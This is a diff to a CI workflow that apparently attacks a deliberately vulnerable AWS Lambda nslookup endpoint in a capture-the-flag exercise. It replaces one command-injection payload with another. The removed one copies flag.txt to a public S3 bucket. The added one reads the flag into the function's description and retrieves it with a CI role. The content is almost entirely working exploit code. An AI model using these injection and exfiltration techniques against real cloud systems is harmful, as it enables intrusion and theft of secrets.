@@ -19,27 +19,27 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Invoke Vulnerable Lambda
+      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata
         run: |
           API_ID="3q931syi7b"
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          echo "=== 1. TRIGGERING DIRECT AWS CLI COPY INSIDE LAMBDA ==="
-          # Direct command injection using the AWS CLI installed in the Lambda layer
-          PAYLOAD='{"domain": "127.0.0.1; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1"}'
+          echo "=== 1. TRIGGERING COMMAND INJECTION TO UPDATE LAMBDA METADATA ==="
+          # Inject command to read flag.txt and update the Lambda function's description
+          PAYLOAD='{"domain": "127.0.0.1; FLAG=$(cat flag.txt); aws lambda update-function-configuration --function-name nslookupv2 --description \"FLAG: $FLAG\" --region us-east-1"}'
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. WAITING 3 SECONDS FOR S3 COPY ==="
+          echo "=== 2. WAITING 3 SECONDS FOR CONFIGURATION UPDATE ==="
           sleep 3
           
-          echo "=== 3. DOWNLOADING FLAG FROM PLATFORM BUCKET ==="
-          # Download from platform-bucket where Principal * has GetObject access!
-          aws s3 cp "s3://platform-bucket-009661764077-us-east-1/flag.txt" ./the_flag.txt
+          echo "=== 3. FETCHING FLAG VIA CICDROLE (LAMBDA GET-FUNCTION) ==="
+          # Since cicdRole has permission to describe the Lambda function, grab the description!
+          aws lambda get-function --function-name nslookupv2 --region us-east-1 --query 'Configuration.Description' --output text > ./the_flag.txt
           
           echo ""
           echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
